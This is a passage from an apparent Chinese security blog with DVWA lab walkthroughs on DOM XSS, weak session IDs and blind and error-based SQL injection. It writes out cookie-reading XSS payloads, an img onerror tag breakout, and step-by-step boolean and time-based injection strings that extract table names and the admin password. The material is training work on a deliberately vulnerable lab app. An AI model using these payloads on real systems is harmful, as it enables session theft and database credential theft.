document.location是由页面的URL按照浏览器的解析填充的。注意这些对象不是提取自HTML的body-它们不会出现在数据页面。文档对象包含一个body对象，它代表对于HTML的解析。</p></blockquote><p><strong>举个例子：</strong></p><p>下面这段代码会从url中获取当前登陆的用户名：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HTML</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TITLE</span><span class="token punctuation">></span></span>Welcome!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>TITLE</span><span class="token punctuation">></span></span>Hi<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SCRIPT</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> pos<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"name="</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>pos<span class="token punctuation">,</span>document<span class="token punctuation">.</span><span class="token constant">URL</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>SCRIPT</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>BR</span><span class="token punctuation">></span></span>Welcome to our system…<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>HTML</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通常这个页面作为用户欢迎页面, 例如:</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">http:&#x2F;&#x2F;www.vulnerable.site&#x2F;welcome.html?name&#x3D;Joe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的代码就会获取此url中的<code>joe</code>用户名</p><p>然而当攻击者构造一个恶意的URL：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnerable<span class="token punctuation">.</span>site<span class="token operator">/</span>welcome<span class="token punctuation">.</span>html<span class="token operator">?</span>name<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将产生xss条件。</p><h2 id="Low等级"><a href="#Low等级" class="headerlink" title="Low等级"></a>Low等级</h2><p>选择一个语言，抓包发现request请求为：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">http:&#x2F;&#x2F;127.0.0.1&#x2F;dvwa&#x2F;vulnerabilities&#x2F;xss_d&#x2F;?default&#x3D;French<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在<code>default=</code>后面构造xss，会不会造成恶意代码执行呢，尝试一下：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190511172535.png" alt="20190511172535.png"></p><p>执行成功。</p><h2 id="Medium等级"><a href="#Medium等级" class="headerlink" title="Medium等级"></a>Medium等级</h2><p>和Low等级执行相同的xss，发现无法执行，怀疑是对用户输入做了过滤，变换构造方法再次执行：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190511175311.png" alt="20190511175311.png"></p><p>界面上无任何提示，我们查看网页源代码，发现我们的语句被插入到了value值中，但是并没有插入到option标签的值中，所以img标签并没有发起任何作用。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190511175427.png" alt="20190511175427.png"></p><p>所以构造链接：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">/</span>dvwa<span class="token operator">/</span>vulnerabilities<span class="token operator">/</span>xss_d<span class="token operator">/</span><span class="token operator">?</span><span class="token keyword">default</span><span class="token operator">=</span><span class="token operator">&lt;</span><span class="token operator">/</span>option<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>select<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190511182121.png" alt="20190511182121.png"></p><p>可看到执行成功，因为将<code>&lt;option&gt;</code>闭合后, 构造的参数成了独立的js代码。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190511182322.png" alt="20190511182322.png"></p><p>查看Medium等级源码，发现对<code>&lt;script&gt;</code>做了过滤。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190511182355.png" alt="20190511182355.png"></p><h2 id="High等级"><a href="#High等级" class="headerlink" title="High等级"></a>High等级</h2><p>使用Medium等级的构造进行执行，发现无效。</p><p>查看源代码：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190511182741.png" alt="20190511182741.png"></p><p>这里high级别的代码先判断defalut值是否为空，如果不为空的话，再用switch语句进行匹配，如果匹配成功，则插入case字段的相应值，如果不匹配，则插入的是默认的值。这样的话，我们的语句就没有可能插入到页面中了。</p><p>但是我们可以利用url中<code>#</code>号的特殊性，<strong>URL中#号之后的内容，不会被提交到服务器，可以直接与浏览器进行交互</strong>。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190511184116.png" alt="20190511184116.png"></p><p>可以看到此方法依旧可以执行js代码。</p><h2 id="Impossible等级"><a href="#Impossible等级" class="headerlink" title="Impossible等级"></a>Impossible等级</h2><p>尝试使用：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">/</span>dvwa<span class="token operator">/</span>vulnerabilities<span class="token operator">/</span>xss_d<span class="token operator">/</span><span class="token operator">?</span><span class="token keyword">default</span><span class="token operator">=</span>English<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现语言框内的值是我们输入的参数的经过URL编码后的数据：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190511201808.png" alt="20190511201808.png"></p><p>查看源代码，发现这里对我们输入的参数并没有进行URL解码，所以我们输入的任何参数都是经过URL编码，然后直接赋值给option标签。所以，就不存在XSS漏洞了。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> DVWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA 不安全的session ID（Weak Session IDs）</title>
      <link href="2019/05/06/weak-session-ids/"/>
      <url>2019/05/06/weak-session-ids/</url>
      
        <content type="html"><![CDATA[<h2 id="session-ID简介"><a href="#session-ID简介" class="headerlink" title="session ID简介"></a>session ID简介</h2><p>由于HTTP协议是无连接的协议，也就是说当客户端访问通过HTTP协议访问服务器时，服务器是无法知道访问我的到底是哪一个客户端。这种情况会导致一系列的问题，比如无法判断是哪个用户登录或者无法面向用户提供差异化服务。于是session ID上场了，用户访问服务器的时候，一般服务器都会分配一个身份证 session id 给用户，用于标识。一个Session ID就对应一个客户端，用户拿到session id 后就会保存到 cookies 上，之后只要拿着 cookies 再访问服务器，服务器就知道你是谁了。</p><p>但是 session id 过于简单就会容易被人伪造，根本都不需要知道用户的密码就能登录服务器了。</p><h2 id="Low等级"><a href="#Low等级" class="headerlink" title="Low等级"></a>Low等级</h2><p>判断session ID分配的方法就是通过抓包寻找规律，但是稍微正常点的网站都会使用随机值去分配Session ID，不像Low等级一样这么傻。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190507225723.png" alt="20190507225723.png"></p><p>点击Genetate抓包查看cookies。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Cookie: dvwaSession&#x3D;1; security&#x3D;low; PHPSESSID&#x3D;phfts9604mgm9mbn4pqqlmkos1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">Cookie: dvwaSession&#x3D;2; security&#x3D;low; PHPSESSID&#x3D;phfts9604mgm9mbn4pqqlmkos1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>…</p><p>可发现session id是由1不断增加，每次加1.</p><p>查看代码也是如此：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190507230130.png" alt="20190507230130.png"></p><h2 id="Medium等级"><a href="#Medium等级" class="headerlink" title="Medium等级"></a>Medium等级</h2><p>同样点击Genetate抓包查看cookies。</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">dvwaSession&#x3D;1557241378; security&#x3D;medium; PHPSESSID&#x3D;phfts9604mgm9mbn4pqqlmkos1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">Cookie: dvwaSession&#x3D;1557241380; security&#x3D;medium; PHPSESSID&#x3D;phfts9604mgm9mbn4pqqlmkos1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>…</p><p>判断规律，发现是当前时间的时间戳，这个有点难判断，但是遇到这种10位数的我们应该往这上面去想。推荐一个在线工具可计算时间戳：<a href="https://tool.lu/timestamp/">https://tool.lu/timestamp/</a></p><p>查看代码：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190507230958.png" alt="20190507230958.png"></p><h2 id="High等级"><a href="#High等级" class="headerlink" title="High等级"></a>High等级</h2><p>同样点击Genetate抓包查看cookies。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">dvwaSession&#x3D;9bf31c7ff062936a96d3c8bd1f8f2ff3; expires&#x3D;Tue, 07-May-2019 16:13:41 GMT; path&#x3D;&#x2F;vulnerabilities&#x2F;weak_id&#x2F;; domain&#x3D;127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">dvwaSession&#x3D;c74d97b01eae257e44aa9d5bade97baf; expires&#x3D;Tue, 07-May-2019 16:14:29 GMT; path&#x3D;&#x2F;vulnerabilities&#x2F;weak_id&#x2F;; domain&#x3D;127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>…</p><p>观察9bf31c7ff062936a96d3c8bd1f8f2ff3和c74d97b01eae257e44aa9d5bade97baf  是不是很像32位的MD5加密呢，尝试去解密：</p><p>9bf31c7ff062936a96d3c8bd1f8f2ff3解密为15</p><p>c74d97b01eae257e44aa9d5bade97baf解密为16</p><p>可发现此等级和Low等级一样也是逐渐加1，只不过用了MD5进行加密。</p><p>查看代码：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190507231820.png" alt="20190507231820.png"></p><h2 id="Impossible等级"><a href="#Impossible等级" class="headerlink" title="Impossible等级"></a>Impossible等级</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">dvwaSession&#x3D;ff034153e10d10820f6e0cb9602fbc3faf7ece57; expires&#x3D;Tue, 07-May-2019 16:32:46 GMT; path&#x3D;&#x2F;vulnerabilities&#x2F;weak_id&#x2F;; domain&#x3D;127.0.0.1; secure; httponly<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此等级下的session id 为40位的随机字符串，无规律可循。</p><p>查看代码：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190507233605.png" alt="20190507233605.png"></p><p>可看到是由随机字符串加时间戳再由sha1加密后的字符串，无法破解。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> DVWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> session </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA SQL盲注（SQL_blind Injection）</title>
      <link href="2019/05/05/dvwa-sql-injection-blind/"/>
      <url>2019/05/05/dvwa-sql-injection-blind/</url>
      
        <content type="html"><![CDATA[<h2 id="sql盲注概述"><a href="#sql盲注概述" class="headerlink" title="sql盲注概述"></a>sql盲注概述</h2><p>在<a href="https://darkless.cn/2019/05/02/dvwa-sql-injection/">这篇文章</a>中详细说了sql回显注入的过程，sql盲注相较于回显注入来说难度提升了不少，应为sql盲注界面上不会回显注入结果，我们只能根据界面仅有的提示判断出数据库的表名和字段名等信息。</p><p>sql盲注可以分为布尔型，延迟注入等类型，二者的原理大致相同。</p><ol><li>布尔盲注：　布尔很明显Ture跟Fales，也就是说它只会根据你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。</li><li>时间盲注：　界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。</li></ol><p>sql盲注常用的函数：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">lenght<span class="token punctuation">(</span><span class="token punctuation">)</span>  返回字符串的长度，例如可以返回数据库名字的长度substr<span class="token punctuation">(</span><span class="token punctuation">)</span>  用来截取字符串ascii<span class="token punctuation">(</span><span class="token punctuation">)</span>  返回字符的ascii码sleep<span class="token punctuation">(</span>n<span class="token punctuation">)</span>  将程序挂起一段时间，n为n秒<span class="token keyword">if</span><span class="token punctuation">(</span>expr1<span class="token punctuation">,</span>expr2<span class="token punctuation">,</span>expr3<span class="token punctuation">)</span>  判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在DVWA上提供的sql盲注的测试页面，下面将会以布尔型注入和延时注入两种方式来解题。</p><h2 id="Low等级"><a href="#Low等级" class="headerlink" title="Low等级"></a>Low等级</h2><p>和sql注入的Low等级一样，此等级未对用户的输入信息做任何过滤，可直接进行注入。</p><p>先输入正常的用户ID进行查询：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190505220645.png" alt="20190505220645.png"></p><p>输入错误的用户ID进行查询：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190505220740.png" alt="20190505220740.png"></p><p>可见界面上只会给我们回显这两种信息，第一种师输入正确的，第二种是输入错误的，那我们就不断构造sql语句进行注入，sql语句真确就会回显第一种提示，反之就会回显第二种提示。基于这种方式的sql注入就是布尔型注入。</p><ol><li>判断是否存在注入，注入是字符型还是数字型</li></ol><p>输入1，显示用户存在</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190505222552.png" alt="20190505222552.png"></p><p>输入 1’ and 1=1 # 显示用户存在</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190505222650.png" alt="20190505222650.png"></p><p>输入 1’ and 1=2 # 显示用户不存在</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190505222729.png" alt="20190505222729.png"></p><p>以上结果说明此处存在数字型的sql盲注</p><ol start="2"><li>猜解当前数据库名</li></ol><p>想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">输入1&#39; and length(database())&#x3D;1 #，显示不存在；输入1&#39; and length(database())&#x3D;2 #，显示不存在；输入1&#39; and length(database())&#x3D;3 #，显示不存在；输入1&#39; and length(database())&#x3D;4 #，显示存在;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上结果说明数据库名长度为4 ，<strong>正常情况下请使用二分法</strong>。</p><p>同样使用<strong>二分法</strong>猜解数据库名。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">输入1&#39; and ascii(substr(databse(),1,1))&gt;97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；输入1&#39; and ascii(substr(databse(),1,1))&lt;122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；输入1&#39; and ascii(substr(databse(),1,1))&lt;109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；输入1&#39; and ascii(substr(databse(),1,1))&lt;103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；输入1&#39; and ascii(substr(databse(),1,1))&lt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；输入1&#39; and ascii(substr(databse(),1,1))&gt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重复上述步骤，就可以猜解出完整的数据库名（dvwa）了。</p><ol start="3"><li>猜解数据库中的表名</li></ol><p>首先猜解数据库中表的数量：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1&#39; and (select count (table_name) from information_schema.tables where table_schema&#x3D;database())&#x3D;1 # 显示不存在1&#39; and (select count (table_name) from information_schema.tables where table_schema&#x3D;database() )&#x3D;2 # 显示存在<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>说明数据库中共有两个表。</p><p>接着挨个猜解表名：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1&#39; and length(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1))&#x3D;1 # 显示不存在1&#39; and length(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1))&#x3D;2 # 显示不存在...1&#39; and length(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1))&#x3D;9 # 显示存在<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>说明第一个表名长度为9。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1’ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;97 # 显示存在1’ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&lt;122 # 显示存在1’ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&lt;109 # 显示存在1’ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&lt;103 # 显示不存在1’ and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&gt;103 # 显示不存在<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>说明第一个表的名字的第一个字符为小写字母g。</p><p>…</p><p>重复上述步骤，即可猜解出两个表名（guestbook、users）。</p><ol start="4"><li>猜解表中的字段名</li></ol><p>首先猜解表中字段的数量：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1’ and (select count(column_name) from information_schema.columns where table_name&#x3D; ’users’)&#x3D;1 # 显示不存在…1’ and (select count(column_name) from information_schema.columns where table_name&#x3D; ’users’)&#x3D;8 # 显示存在<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>说明users表有8个字段。</p><p>接着挨个猜解字段名：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1’ and length(substr((select column_name from information_schema.columns where table_name&#x3D; ’users’ limit 0,1),1))&#x3D;1 # 显示不存在…1’ and length(substr((select column_name from information_schema.columns where table_name&#x3D; ’users’ limit 0,1),1))&#x3D;7 # 显示存在<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>说明users表的第一个字段为7个字符长度。</p><p>采用二分法，即可猜解出所有字段名。</p><ol start="5"><li>猜解用户名密码</li></ol><p>同样采用二分法。</p><p>用户 admin 存在吗？</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1&#39; and (select count(*) from users where user &#x3D; &#39;admin&#39;) &#x3D; 1 #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>admin 密码的第一位在 a~m 之间吗？</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1&#39; and ascii(substr((select password from users where user &#x3D; &#39;admin&#39; limit 1),1,1)) &gt;&#x3D; 97 and ascii(substr((select password from users where user &#x3D; &#39;admin&#39; limit 1),1,1)) &lt;&#x3D; 109 #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>…</p><p>后续过程略。</p><p>还可以使用<strong>基于时间的盲注</strong>：</p><ol><li>判断是否存在注入，注入是字符型还是数字型</li></ol><pre class="line-numbers language-text" data-language="text"><code class="language-text">输入1’ and sleep(5) #，感觉到明显延迟；输入1 and sleep(5) #，没有延迟；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>说明存在字符型的基于时间的盲注。</p><ol start="2"><li>猜解当前数据库名</li></ol><p>首先猜解数据名的长度：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1’ and if(length(database())&#x3D;1,sleep(5),1) # 没有延迟1’ and if(length(database())&#x3D;2,sleep(5),1) # 没有延迟1’ and if(length(database())&#x3D;3,sleep(5),1) # 没有延迟1’ and if(length(database())&#x3D;4,sleep(5),1) # 明显延迟<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>说明数据库名长度为4个字符。</p><p>接着采用二分法猜解数据库名：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟…1’ and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 没有延迟1’ and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 没有延迟<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>说明数据库名的第一个字符为小写字母d。</p><p>…</p><p>重复上述步骤，即可猜解出数据库名。</p><ol start="3"><li>猜解数据库中的表名</li></ol><p>首先猜解数据库中表的数量：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1’ and if((select count(table_name) from information_schema.tables where table_schema&#x3D;database() )&#x3D;1,sleep(5),1)# 没有延迟1’ and if((select count(table_name) from information_schema.tables where table_schema&#x3D;database() )&#x3D;2,sleep(5),1)# 明显延迟<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>说明数据库中有两个表。</p><p>接着挨个猜解表名：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1’ and if(length(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1))&#x3D;1,sleep(5),1) # 没有延迟…1’ and if(length(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1))&#x3D;9,sleep(5),1) # 明显延迟<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>说明第一个表名的长度为9个字符。</p><p>采用二分法即可猜解出表名。</p><ol start="4"><li>猜解表中的字段名</li></ol><p>首先猜解表中字段的数量：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1’ and if((select count(column_name) from information_schema.columns where table_name&#x3D; ’users’)&#x3D;1,sleep(5),1)# 没有延迟…1’ and if((select count(column_name) from information_schema.columns where table_name&#x3D; ’users’)&#x3D;8,sleep(5),1)# 明显延迟<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>说明users表中有8个字段。</p><p>接着挨个猜解字段名：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1’ and if(length(substr((select column_name from information_schema.columns where table_name&#x3D; ’users’ limit 0,1),1))&#x3D;1,sleep(5),1) # 没有延迟…1’ and if(length(substr((select column_name from information_schema.columns where table_name&#x3D; ’users’ limit 0,1),1))&#x3D;7,sleep(5),1) # 明显延迟<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>说明users表的第一个字段长度为7个字符。</p><p>采用二分法即可猜解出各个字段名。</p><ol start="5"><li>猜解用户名密码</li></ol><p>同样采用二分法。</p><h2 id="Medium等级"><a href="#Medium等级" class="headerlink" title="Medium等级"></a>Medium等级</h2><p>和sql回显注入一样，Medium可以通过抓包修改参数的方式注入,具体过程和low等级相同.</p><h2 id="High等级"><a href="#High等级" class="headerlink" title="High等级"></a>High等级</h2><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190505233010.png" alt="20190505233010.png"></p><p>可以看到，High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p><p>虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，所以可以使用基于布尔的盲注.</p><h2 id="使用sqlmap进行注入"><a href="#使用sqlmap进行注入" class="headerlink" title="使用sqlmap进行注入"></a>使用sqlmap进行注入</h2><p>sql盲注使用手工的方式简直能把人搞崩溃,幸亏有sqlmap这种自动化工具来帮忙. 这里仅演示High等级的sqlmap注入,其它等级和sql回显注入相同,参考<a href="https://darkless.cn/2019/05/02/dvwa-sql-injection/">上篇文章</a>.</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190505234030.png" alt="20190505234030.png"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.freebuf.com/articles/web/120985.html">https://www.freebuf.com/articles/web/120985.html</a><br><a href="https://www.jianshu.com/p/65f05e7cc957">https://www.jianshu.com/p/65f05e7cc957</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> DVWA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL盲注 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA SQL注入（SQL Injection）</title>
      <link href="2019/05/02/dvwa-sql-injection/"/>
      <url>2019/05/02/dvwa-sql-injection/</url>
      
        <content type="html"><![CDATA[<h2 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h2><p>Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一。</p><p>当访问动态网页时, Web 服务器会向数据库发起 Sql 查询请求，如果权限验证通过就会执行 Sql 语句。</p><p>这种网站内部直接发送的Sql请求一般不会有危险，<strong>但实际情况是很多时候需要结合用户的输入数据动态构造 Sql 语句，如果用户输入的数据被构造成恶意 Sql 代码，Web 应用又未对动态构造的 Sql 语句使用的参数进行审查，则会带来意想不到的危险。</strong></p><p>Sql 注入带来的威胁主要有如下几点：</p><ul><li>猜解后台数据库，这是利用最多的方式，盗取网站的敏感信息。</li><li>绕过认证，列如绕过验证登录网站后台。</li><li>注入可以借助数据库的存储过程进行提权等操作</li></ul><h2 id="Low等级"><a href="#Low等级" class="headerlink" title="Low等级"></a>Low等级</h2><p>先随便输入一个用户ID，查看返回的情况：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190502142723.png" alt="20190502142723.png"></p><p>当输入的用户ID过大时，数据库中没有这个ID，界面不会有任何返回信息。</p><p>输入ID为1时，界面返回ID为1的用户信息：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190502142836.png" alt="20190502142836.png"></p><p>此时执行的sql语句为：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> first_name<span class="token punctuation">,</span> last_name <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> user_id <span class="token operator">=</span> <span class="token string">'1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>输入恶意的ID就可以构造不同的sql语句进行执行，从而查询出我们想得到的一切信息。</strong></p><p>注入过程：</p><ol><li><p>判断是否存在注入，注入类型是数字型还是字符型</p><ul><li>输入ID为<code>1&#39;</code>出现以下提示：</li></ul><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190502143452.png" alt="20190502143452.png"></p><p>因为此时执行的sql语句相当于：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> first_name<span class="token punctuation">,</span> last_name <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> user_id <span class="token operator">=</span> <span class="token string">'1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个语句显然错误。</p><ul><li>输入ID为<code>1&#39; and &#39;1&#39; = &#39;1</code>时出现以下提示：</li></ul><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190502143927.png" alt="20190502143927.png"></p><p> 因为此时执行的sql语句相当于：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> first_name<span class="token punctuation">,</span> last_name <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> user_id <span class="token operator">=</span> <span class="token string">'1'</span> <span class="token operator">and</span> <span class="token string">'1'</span> <span class="token operator">=</span> <span class="token string">'1'</span><span 